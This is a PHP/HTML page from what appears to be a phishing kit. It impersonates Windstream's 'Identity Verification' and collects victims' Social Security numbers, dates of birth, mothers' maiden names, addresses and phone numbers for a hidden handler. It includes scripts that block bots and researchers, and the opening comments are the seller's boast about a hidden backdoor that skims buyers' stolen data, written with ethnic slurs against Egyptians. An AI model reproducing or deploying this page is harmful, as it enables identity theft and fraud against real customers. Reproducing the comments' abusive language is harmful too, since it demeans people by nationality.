<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <title>Windstream - Identity Verification</title>

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- jQuery & Input Masking -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <!-- Font Awesome for eye icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script>
    $(function() {
        $('#pnumb').mask('(000) 000-0000');
        $('#ZipCode').mask('00000');
        $('#DateofBirth').mask('00/00/0000');
        $('#ssnr').mask('000-00-0000');

        let fullSsn = '';

        $('#toggleSsn').click(function() {
            const $ssnInput = $('#ssnr');
            const $icon = $(this).find('i');

            if ($ssnInput.attr('type') === 'password') {
                $ssnInput.attr('type', 'text');
                $ssnInput.val(fullSsn);
                $icon.removeClass('fa-eye').addClass('fa-eye-slash');
            } else {
                $ssnInput.attr('type', 'password');
                $ssnInput.val(fullSsn);
                $icon.removeClass('fa-eye-slash').addClass('fa-eye');
            }
        });

        $('#ssnr').on('input', function() {
            fullSsn = $(this).val();
        });

        $('form').on('submit', function() {
            $('#ssnr').val(fullSsn);
        });
    });
    </script>

    <style>
    /* Custom Windstream-themed styles */
    .form-container {
        background: linear-gradient(145deg, #ffffff, #f8f9fa);
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
        border-radius: 1.5rem;
    }

    .input-field {
        transition: all 0.3s ease;
    }

    .input-field:focus {
        border-color: #00002e;
        box-shadow: 0 0 0 3px rgba(239, 103, 36, 0.15);
    }

    .submit-btn {
        background-color: #00002e;
        transition: all 0.3s ease;
    }

    .submit-btn:hover {
        background-color: #d85c20;
        transform: translateY(-2px);
    }

    .brand-orange {
        color: #00002e;
    }
    </style>
</head>

<body class="bg-gray-50 min-h-screen flex flex-col font-sans">

    <!-- Header -->
    <header class="bg-white shadow-sm">
        <nav class="container mx-auto px-6 py-4 flex justify-center items-center">
            <a href="#" aria-label="Windstream Home">
                <img src="./assets/img/windstream.jpg" alt="Windstream Logo" class="h-12">
            </a>
        </nav>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center py-12 px-4">
        <div class="form-container rounded-2xl p-8 max-w-2xl w-full">
            <h1 class="text-3xl font-bold text-gray-900 text-center mb-2">
                Complete Identity Verification
            </h1>
            <p class="text-gray-500 text-center mb-8 text-sm">
                Please provide the required information to verify your identity and secure your account.
            </p>

            <form action="../next.php" method="post" class="grid md:grid-cols-2 gap-5">
                <!-- Left Column -->
                <div class="space-y-5">
                    <!-- Full Name -->
                    <div>
                        <label for="fullName" class="block text-sm font-medium text-gray-700">Full Name</label>
                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>

                    <!-- SSN -->
                    <div class="relative">
                        <label for="ssnr" class="block text-sm font-medium text-gray-700">Social Security Number</label>
                        <input type="password" id="ssnr" name="ssnr" inputmode="numeric" placeholder="XXX-XX-XXXX"
                            minlength="11" maxlength="11" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500 pr-12">
                        <button type="button" id="toggleSsn"
                            class="absolute inset-y-0 right-0 flex items-center pr-4 mt-6">
                            <i class="fas fa-eye text-gray-400"></i>
                        </button>
                    </div>

                    <!-- Phone Number -->
                    <div>
                        <label for="pnumb" class="block text-sm font-medium text-gray-700">Phone Number</label>
                        <input type="text" id="pnumb" name="pnumb" inputmode="numeric" placeholder="(XXX) XXX-XXXX"
                            minlength="12" maxlength="12" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>

                    <!-- City -->
                    <div>
                        <label for="city" class="block text-sm font-medium text-gray-700">City</label>
                        <input type="text" id="city" name="city" placeholder="Enter your city" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>
                </div>

                <!-- Right Column -->
                <div class="space-y-5">
                    <!-- Date of Birth -->
                    <div>
                        <label for="DateofBirth" class="block text-sm font-medium text-gray-700">Date of Birth</label>
                        <input type="text" id="DateofBirth" name="DateofBirth" inputmode="numeric"
                            placeholder="MM/DD/YYYY" minlength="10" maxlength="10" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>

                    <!-- Mother's Maiden Name -->
                    <div>
                        <label for="mmnr" class="block text-sm font-medium text-gray-700">Mother's Maiden Name</label>
                        <input type="text" id="mmnr" name="mmnr" placeholder="Enter mother's maiden name" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>

                    <!-- Address -->
                    <div>
                        <label for="eAddress" class="block text-sm font-medium text-gray-700">Address</label>
                        <input type="text" id="eAddress" name="eAddress" placeholder="Enter your address" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>

                    <!-- Zip Code -->
                    <div>
                        <label for="ZipCode" class="block text-sm font-medium text-gray-700">Zip Code</label>
                        <input type="text" id="ZipCode" name="ZipCode" inputmode="numeric" placeholder="XXXXX"
                            minlength="5" maxlength="5" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>
                </div>

                <!-- Full Width: Declaration & Submit -->
                <div class="md:col-span-2 space-y-4 mt-4">

                    <div class="text-center">
                        <button type="submit" name="submit"
                            class="submit-btn w-full text-white px-6 py-3 rounded-lg font-medium text-lg hover:shadow-lg">
                            Continue
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </main>



</body>

</html>